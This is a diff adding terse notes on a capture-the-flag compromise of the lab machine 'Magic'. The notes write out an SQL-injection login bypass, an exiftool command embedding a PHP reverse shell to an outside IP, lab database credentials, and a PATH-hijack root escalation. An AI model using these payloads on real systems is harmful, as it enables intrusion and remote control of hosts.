@@ -1,0 +1,54 @@
+- Did nmap two ports open 22 80 running apache
+- on 80 there was an image hosting service that allowed upload only on login
+- logged in using sql injection on username as admin'# and password whatever
+- Used exiftool to inject php code in exif data (metadata basically).
+- Command used was exiftool -Comment="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.15.217/4444 0>&1'\"); ?>" 6.php.jpg
+- I knew uploads went to http://magic.htb/images/uploads/6.php.jpg
+- Got shell as www-data
+- There were two users in total root and theseus
+- theseus's password was in a php db script
+- <?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    private static $cont  = null;
+
+    public function __construct() {
+        die('Init function is not allowed');
+    }
+
+    public static function connect()
+    {
+        // One connection through whole application
+        if ( null == self::$cont )
+        {
+            try
+            {
+                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
+            }
+            catch(PDOException $e)
+            {
+                die($e->getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+- Cannot login using this pwd in ssh
+- ran mysqldump -u theseus -p iamthekingtheseus Magic and got admin login password
+- which was 'admin','Th3s3usW4sK1ng'
+- could su as theseus.
+- Generated ssh key and added it to his directory.
+- ran strings on sysinfo bin (looked shady in linenum)
+- saw that is was running another bin lshw as root
+- made my own lshw in /tmp/cos put a reverse shell in it and added /tmp/cos in $PATH 
+- ran sysinfo and caught reverse shell as root
+- PWND BITCH
